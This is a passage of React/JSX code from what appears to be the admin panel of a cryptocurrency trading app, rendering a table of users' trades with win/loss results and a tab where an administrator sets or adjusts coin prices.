          <div className="table-head" style={{ gridTemplateColumns:"1.5fr .8fr .8fr 1fr 1fr .9fr 1fr 1.2fr" }}>
            <span>User</span><span>Type</span><span>Coin</span><span>Amount</span><span>Total</span><span>Result</span><span>P/L %</span><span>Time</span>
          </div>
          {trades.length===0
            ? <div style={{ textAlign:"center",padding:"40px 20px",color:"var(--text-muted)" }}>No trades yet.</div>
            : trades.slice(0,100).map(t=>{
              const u=users.find(x=>x.id===t.userId);
              const isWin  = t.resultType==="profit";
              const isLoss = t.resultType==="loss";
              return (
                <div key={t.id} className="table-row" style={{ gridTemplateColumns:"1.5fr .8fr .8fr 1fr 1fr .9fr 1fr 1.2fr" }}>
                  <span style={{ fontWeight:600,fontSize:13 }}>{u?.name||"Unknown"}</span>
                  <span style={{
                    display:"inline-flex",alignItems:"center",padding:"2px 9px",borderRadius:99,fontSize:11,fontWeight:700,
                    background:t.type==="buy"?"rgba(16,185,129,.12)":"rgba(239,68,68,.12)",
                    color:t.type==="buy"?"#10b981":"#ef4444",
                  }}>{t.type.toUpperCase()}</span>
                  <span style={{ fontWeight:600 }}>{t.coin}</span>
                  <span style={{ ...MONO,fontSize:12 }}>{t.amount.toFixed(4)}</span>
                  <span style={{ fontWeight:700,...MONO }}>${fmt2(t.total)}</span>
                  {/* Result badge */}
                  <span style={{
                    display:"inline-flex",alignItems:"center",padding:"2px 9px",borderRadius:99,fontSize:11,fontWeight:700,
                    background:isWin?"rgba(16,185,129,.12)":isLoss?"rgba(239,68,68,.12)":"rgba(136,150,179,.12)",
                    color:isWin?"#10b981":isLoss?"#ef4444":"#8896b3",
                  }}>
                    {isWin?"📈 Win":isLoss?"📉 Loss":"⚖️ Normal"}
                  </span>
                  {/* P/L percentage */}
                  <span style={{ fontWeight:700,fontSize:12,...MONO,color:isWin?"#10b981":isLoss?"#ef4444":"var(--text-muted)" }}>
                    {isWin?`+${t.profitLossPct||"?"}%`:isLoss?`${t.profitLossPct||"?"}%`:"—"}
                  </span>
                  <span style={{ fontSize:11,color:"var(--text-muted)" }}>{new Date(t.time).toLocaleTimeString()}</span>
                </div>
              );
            })
          }
        </div>
      )}

      {/* ══════════ PRICES TAB ════════════════════════════ */}
      {tab === "prices" && (
        <div>
          <div style={{ padding:"10px 14px",background:"rgba(247,147,26,.05)",border:"1px solid var(--border-gold-s)",borderLeft:"3px solid var(--gold)",borderRadius:"0 10px 10px 0",fontSize:13,color:"var(--text-secondary)",marginBottom:20 }}>
            💹 Adjust any coin's price. Changes apply instantly and affect all portfolio valuations.
          </div>
          <div className="grid-2">
            {coins.map(c=>(
              <div key={c.id} className="card">
                <div style={{ display:"flex",alignItems:"center",gap:12,marginBottom:14 }}>
                  <CoinChip coin={c} size={40}/>
                  <div style={{ flex:1 }}>
                    <div style={{ fontWeight:700,fontSize:15 }}>{c.name}</div>
                    <div style={{ fontSize:12,color:"var(--text-muted)" }}>
                      Current: <strong style={{ color:"var(--gold)",...MONO }}>${c.price.toLocaleString()}</strong>
                    </div>
                  </div>
                  <span style={{ ...MONO,fontSize:13,fontWeight:700,color:c.change>=0?"#10b981":"#ef4444" }}>
                    {c.change>=0?"+":""}{c.change}%
                  </span>
                </div>
                <div style={{ display:"flex",gap:8,marginBottom:8 }}>
                  <input type="number" placeholder={`New price for ${c.id}…`}
                    value={editP[c.id]||""}
                    onChange={e=>setEditP(p=>({...p,[c.id]:e.target.value}))}/>
                  <button className="btn btn-primary" style={{ padding:"10px 16px",fontSize:13,flexShrink:0 }}
                    onClick={()=>{ const np=parseFloat(editP[c.id]); if(np>0){updateCoinPrice(c.id,np);setEditP(p=>({...p,[c.id]:""}));} }}>
                    Set
                  </button>
                </div>
                <div style={{ display:"flex",gap:5 }}>
                  {[{l:"-20%",f:.80},{l:"-10%",f:.90},{l:"-5%",f:.95},{l:"+5%",f:1.05},{l:"+10%",f:1.10},{l:"+20%",f:1.20}].map(({l,f})=>(
                    <button key={l}
                      style={{ flex:1,padding:"5px 0",borderRadius:6,fontSize:11,fontWeight:600,cursor:"pointer",fontFamily:"var(--font-body)",border:"1px solid var(--border-soft)",background:"transparent",color:l.startsWith("+")?"#10b981":"#ef4444" }}
                      onClick={()=>updateCoinPrice(c.id,parseFloat((c.price*f).toFixed(c.price<1?4:2)))}>
                      {l}
                    </button>
                  ))}
                </div>
              </div>
            ))}
          </div>
        </div>
      )}
    </div>
  );
}
